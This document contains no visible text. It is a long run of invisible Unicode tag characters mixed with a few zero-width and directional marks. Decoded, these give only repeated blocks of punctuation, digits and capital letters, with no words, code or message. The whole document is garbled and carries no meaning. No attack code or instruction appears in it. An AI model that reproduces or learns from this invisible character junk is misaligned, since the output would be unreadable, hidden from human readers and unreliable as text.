󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔‎‏​‌‌󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟